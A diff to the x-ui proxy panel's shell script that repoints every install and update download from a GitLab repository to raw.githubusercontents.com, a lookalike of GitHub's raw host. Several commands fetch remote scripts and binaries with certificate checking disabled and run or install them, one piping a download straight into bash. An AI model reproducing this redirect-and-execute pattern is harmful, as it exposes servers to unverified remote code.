@@ -105,7 +105,7 @@ before_show_menu() {
 }
 
 install() {
-    wget -N https://gitlab.com/rwkgyg/x-ui-yg/raw/main/install.sh && bash install.sh
+    wget -N https://raw.githubusercontents.com/avotcorg/x-ui/main/install.sh && bash install.sh
     if [[ $? == 0 ]]; then
         if [[ $# == 0 ]]; then
             start
@@ -138,7 +138,7 @@ update() {
     systemctl stop x-ui
     cd /usr/local/
     if  [ $# == 0 ] ;then
-        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz https://gitlab.com/rwkgyg/x-ui-yg/raw/main/x-ui-linux-${arch}.tar.gz
+        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz https://raw.githubusercontents.com/avotcorg/x-ui/main/x-ui-linux-${arch}.tar.gz
         if [[ $? -ne 0 ]]; then
             echo -e "${red}下载 x-ui 失败，请确保你的服务器能够下载 Github 的文件${plain}"
             rm -rf install.sh
@@ -146,7 +146,7 @@ update() {
         fi
     else
         last_version=$1
-        url="https://gitlab.com/rwkgyg/x-ui-yg/raw/main/x-ui-linux-${arch}.tar.gz"
+        url="https://raw.githubusercontents.com/avotcorg/x-ui/main/x-ui-linux-${arch}.tar.gz"
         echo -e "开始安装 x-ui v$1"
         wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz ${url}
         if [[ $? -ne 0 ]]; then
@@ -163,7 +163,7 @@ update() {
     cd x-ui
     chmod +x x-ui bin/xray-linux-${arch}
     cp -f x-ui.service /etc/systemd/system/
-    wget --no-check-certificate -O /usr/bin/x-ui https://gitlab.com/rwkgyg/x-ui-yg/raw/main/x-ui.sh
+    wget --no-check-certificate -O /usr/bin/x-ui https://raw.githubusercontents.com/avotcorg/x-ui/main/x-ui.sh
     chmod +x /usr/bin/x-ui
     chmod +x /usr/local/x-ui/x-ui.sh
     systemctl daemon-reload
@@ -374,7 +374,7 @@ bash <(curl -L -s https://raw.githubusercontent.com/teddysun/across/master/bbr.s
 
 
 update_shell() {
-    wget -O /usr/bin/x-ui -N --no-check-certificate https://gitlab.com/rwkgyg/x-ui-yg/raw/main/x-ui.sh
+    wget -O /usr/bin/x-ui -N --no-check-certificate https://raw.githubusercontents.com/avotcorg/x-ui/main/x-ui.sh
     if [[ $? != 0 ]]; then
         echo ""
         echo -e "${red}下载脚本失败，请检查本机能否连接 Github${plain}"
@@ -529,7 +529,7 @@ show_menu() {
     green "$acp"
     echo "------------------------------------------"
     xuiygV="22.7.4 V 0.3.3.15.8"
-    remoteV=`wget -qO- https://gitlab.com/rwkgyg/x-ui-yg/raw/main/install.sh | sed  -n 2p | cut -d '"' -f 2`
+    remoteV=`wget -qO- https://raw.githubusercontents.com/avotcorg/x-ui/main/install.sh | sed  -n 2p | cut -d '"' -f 2`
     localV=${xuiygV}
     if [ "${localV}" = "${remoteV}" ]; then
     green "已安装最新版本：${xuiygV} ，如有更新，此处会自动提示"
